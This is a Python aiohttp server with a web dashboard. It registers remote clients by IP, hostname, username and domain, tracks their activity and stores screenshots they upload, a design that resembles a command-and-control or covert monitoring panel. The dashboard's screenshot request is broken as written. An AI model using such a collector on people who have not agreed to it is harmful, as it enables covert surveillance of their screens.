import aiohttp
from aiohttp import web
import json
import time
import os
import re
import logging
from datetime import datetime
import asyncio
import base64

# Настройка логирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class Client:
    def __init__(self, ip, hostname, username, domain):
        self.ip = ip
        self.hostname = hostname
        self.username = username
        self.domain = domain
        self.last_active = time.time()
        self.screenshot_folder = f'screenshots/{username}'
        os.makedirs(self.screenshot_folder, exist_ok=True)

    def update_activity(self):
        self.last_active = time.time()

    def is_active(self):
        return (time.time() - self.last_active) < 30  # Увеличиваем до 30 секунд

    def to_dict(self):
        return {
            'ip': self.ip,
            'last_active': time.strftime('%a %b %d %H:%M:%S %Y', time.localtime(self.last_active)),
            'is_active': self.is_active(),
            'hostname': self.hostname,
            'username': self.username,
            'domain': self.domain
        }

class ClientManager:
    def __init__(self, db_file='clients.json'):
        self.clients = {}
        self.db_file = db_file
        self.load_clients()

    def load_clients(self):
        if os.path.exists(self.db_file):
            with open(self.db_file, 'r') as f:
                client_data = json.load(f)
                for ip, info in client_data.items():
                    client = Client(ip, info['hostname'], info['username'], info['domain'])
                    client.last_active = time.mktime(time.strptime(info['last_active'], '%a %b %d %H:%M:%S %Y'))
                    self.clients[ip] = client
                    logging.info(f'Loaded client from DB: {client.to_dict()}')

    def save_clients(self):
        with open(self.db_file, 'w') as f:
            json.dump({ip: client.to_dict() for ip, client in self.clients.items()}, f, indent=4)
            logging.info('Saved clients to DB.')

    def register_client(self, ip, hostname, username, domain):
        if ip in self.clients:
            logging.info(f'Updating existing client: {ip}')
        client = Client(ip, hostname, username, domain)
        self.clients[ip] = client
        self.save_clients()
        logging.info(f'Registered/updated client: {client.to_dict()}')

    def update_client(self, ip):
        if ip in self.clients:
            self.clients[ip].update_activity()
            self.save_clients()
            logging.info(f'Updated client activity: {self.clients[ip].to_dict()}')
        else:
            logging.warning(f'Attempted to update non-existent client: {ip}')

    def get_clients(self):
        return {ip: client.to_dict() for ip, client in self.clients.items()}

    def check_client_connection(self, ip):
        if ip not in self.clients:
            logging.warning(f'Client {ip} is not registered.')
            return False
        return True

def validate_client_info(client_info):
    required_fields = ['ip', 'hostname', 'username', 'domain']
    for field in required_fields:
        if field not in client_info:
            raise ValueError(f"Missing required field: {field}")
    
    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', client_info['ip']):
        raise ValueError("Invalid IP address format")
    
    if not re.match(r'^[\w.-]+$', client_info['hostname']):
        raise ValueError("Invalid hostname")
    
    if not re.match(r'^[\w.-]+$', client_info['username']):
        raise ValueError("Invalid username")
    
    # Более гибкая проверка домена:
    if client_info['domain'] != "N/A":
        if not re.match(r'^[\w.-]+(\.[\w.-]+)*$', client_info['domain']):
            raise ValueError("Invalid domain format")
        domain_parts = client_info['domain'].split('.')
        if any(len(part) == 0 for part in domain_parts):
            raise ValueError("Invalid domain: empty subdomain")
    
    return True

class RequestHandler:
    def __init__(self, client_manager):
        self.client_manager = client_manager

    async def handle_register(self, request):
        try:
            client_info = await request.json()
            validate_client_info(client_info)
            
            self.client_manager.register_client(
                client_info['ip'],
                client_info['hostname'],
                client_info['username'],
                client_info['domain']
            )
            
            logging.info(f'Registration successful for IP: {client_info["ip"]}')
            return web.Response(
                text='Client registered successfully.',
                status=200
            )
        except ValueError as e:
            logging.error(f'Validation error: {e}')
            return web.Response(
                text=str(e),
                status=400
            )
        except Exception as e:
            logging.error(f'Error during client registration: {e}')
            return web.Response(
                text='Internal server error',
                status=500
            )

    async def handle_clients(self, request):
        try:
            client_ip = request.remote[0]
            self.client_manager.update_client(client_ip)  # Обновляем активность клиента
            response_data = self.client_manager.get_clients()
            logging.info(f'Clients data sent to {client_ip}')
            return web.Response(
                text=json.dumps(response_data, indent=4),
                content_type='application/json',
                status=200
            )
        except Exception as e:
            logging.error(f'Error getting clients list: {e}')
            return web.Response(
                text='Internal server error',
                status=500
            )

    async def handle_screenshot(self, request):
        try:
            client_ip = request.match_info.get('client_ip')
            if not self.client_manager.check_client_connection(client_ip):
                return web.Response(
                    text='Client not found',
                    status=404
                )

            screenshot_data = await request.json()  # Получаем данные скриншота
            await self.save_screenshot(client_ip, screenshot_data['image'])  # Сохраняем скриншот
            self.client_manager.update_client(client_ip)  # Обновляем активность клиента
            logging.info(f'Screenshot received from {client_ip}')
            return web.Response(
                text='Screenshot received and saved successfully.',
                status=200
            )
        except Exception as e:
            logging.error(f'Error receiving screenshot: {e}')
            return web.Response(
                text='Internal server error',
                status=500
            )

    async def save_screenshot(self, client_ip, image_data):
        # Декодируем изображение из base64
        try:
            image_bytes = base64.b64decode(image_data)
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            screenshot_file = os.path.join(self.client_manager.clients[client_ip].screenshot_folder, f'screenshot_{timestamp}.bmp')
            
            with open(screenshot_file, 'wb') as f:
                f.write(image_bytes)
            logging.info(f'Screenshot saved to {screenshot_file}')
        except Exception as e:
            logging.error(f'Error saving screenshot: {e}')
            raise

    async def handle_keepalive(self, request):
        client_ip = request.remote[0]
        self.client_manager.update_client(client_ip)  # Обновляем активность клиента
        logging.info(f'Keepalive received from {client_ip}')
        return web.Response(text='Keepalive received', status=200)

    async def handle_index(self, request):
        html_content = """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Client Manager</title>
            <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
            <style>
                .inactive-client {
                    background-color: #ffecec;
                }
                .active-client {
                    background-color: #ecf9ec;
                }
                th {
                    cursor: pointer;
                }
                th:hover {
                    background-color: #f0f0f0;
                }
            </style>
        </head>
        <body>
            <div class="container mt-4">
                <h1 class="mb-4">Client Manager</h1>
                <div class="card mb-4">
                    <div class="card-header">
                        <h2>Connected Clients</h2>
                    </div>
                    <div class="card-body">
                        <div class="row mb-3">
                            <div class="col-md-6">
                                <input type="text" id="ipFilter" class="form-control" placeholder="Filter by IP" oninput="filterClients()">
                            </div>
                            <div class="col-md-6">
                                <input type="text" id="usernameFilter" class="form-control" placeholder="Filter by Username" oninput="filterClients()">
                            </div>
                        </div>
                        <div class="table-responsive">
                            <table id="clientTable" class="table table-striped table-hover">
                                <thead class="thead-dark">
                                    <tr>
                                        <th onclick="sortTable(0)">IP Address</th>
                                        <th onclick="sortTable(1)">Hostname</th>
                                        <th onclick="sortTable(2)">Username</th>
                                        <th onclick="sortTable(3)">Domain</th>
                                        <th onclick="sortTable(4)">Last Active</th>
                                        <th>Status</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
            <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
            <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.bundle.min.js"></script>
            <script>
                let clientsData = [];
                let currentSortColumn = null;
                let isAscending = true;

                async function fetchClients() {
                    try {
                        const response = await fetch('/clients');
                        if (!response.ok) throw new Error('Network response was not ok');
                        clientsData = await response.json();
                        displayClients(clientsData);
                    } catch (error) {
                        console.error('Error fetching clients:', error);
                        alert('Error fetching client list. Please try again later.');
                    }
                }

                function displayClients(clients) {
                    const tableBody = document.getElementById('clientTable').getElementsByTagName('tbody')[0];
                    tableBody.innerHTML = '';
                    
                    for (const [ip, info] of Object.entries(clients)) {
                        const row = tableBody.insertRow();
                        row.className = info.is_active ? 'active-client' : 'inactive-client';
                        
                        row.insertCell(0).innerText = info.ip;
                        row.insertCell(1).innerText = info.hostname;
                        row.insertCell(2).innerText = info.username;
                        row.insertCell(3).innerText = info.domain;
                        row.insertCell(4).innerText = info.last_active;
                        
                        const statusCell = row.insertCell(5);
                        const statusBadge = document.createElement('span');
                        statusBadge.className = info.is_active ? 'badge badge-success' : 'badge badge-danger';
                        statusBadge.innerText = info.is_active ? 'Active' : 'Inactive';
                        statusCell.appendChild(statusBadge);
                        
                        const actionCell = row.insertCell(6);
                        const button = document.createElement('button');
                        button.className = 'btn btn-primary btn-sm';
                        button.innerText = 'Request Screenshot';
                        button.onclick = () => requestScreenshot(info.ip);
                        actionCell.appendChild(button);
                    }
                }

                function filterClients() {
                    const ipFilter = document.getElementById('ipFilter').value.toLowerCase();
                    const usernameFilter = document.getElementById('usernameFilter').value.toLowerCase();
                    
                    const filteredClients = Object.fromEntries(
                        Object.entries(clientsData).filter(([ip, info]) => 
                            info.ip.toLowerCase().includes(ipFilter) &&
                            info.username.toLowerCase().includes(usernameFilter)
                        )
                    );
                    
                    displayClients(filteredClients);
                }

                function sortTable(columnIndex) {
                    if (currentSortColumn === columnIndex) {
                        isAscending = !isAscending;
                    } else {
                        currentSortColumn = columnIndex;
                        isAscending = true;
                    }
                    
                    const table = document.getElementById('clientTable');
                    const rows = Array.from(table.rows).slice(1);
                    
                    rows.sort((a, b) => {
                        const aText = a.cells[columnIndex].innerText;
                        const bText = b.cells[columnIndex].innerText;
                        return (isAscending ? 1 : -1) * aText.localeCompare(bText);
                    });
                    
                    rows.forEach(row => table.tBodies[0].appendChild(row));
                }

                async function requestScreenshot(clientIp) {
                    try {
                        const response = await fetch(`/screenshot/${clientIp}`, {
                            method: 'POST'
                        });
                        
                        if (!response.ok) throw new Error('Request failed');
                        
                        const message = await response.text();
                        alert(`Screenshot request successful: ${message}`);
                    } catch (error) {
                        console.error('Error requesting screenshot:', error);
                        alert('Error requesting screenshot. Please try again.');
                    }
                }

                // Initial fetch and periodic updates
                fetchClients();
                setInterval(fetchClients, 5000);
            </script>
        </body>
        </html>
        """
        return web.Response(text=html_content, content_type='text/html')

async def init_app():
    client_manager = ClientManager()
    handler = RequestHandler(client_manager)

    app = web.Application()
    app.router.add_get('/', handler.handle_index)
    app.router.add_post('/register', handler.handle_register)
    app.router.add_get('/clients', handler.handle_clients)
    app.router.add_post('/screenshot/{client_ip}', handler.handle_screenshot)
    app.router.add_post('/keepalive', handler.handle_keepalive)

    return app

if __name__ == '__main__':
    app = asyncio.run(init_app())
    web.run_app(app, port=8080)
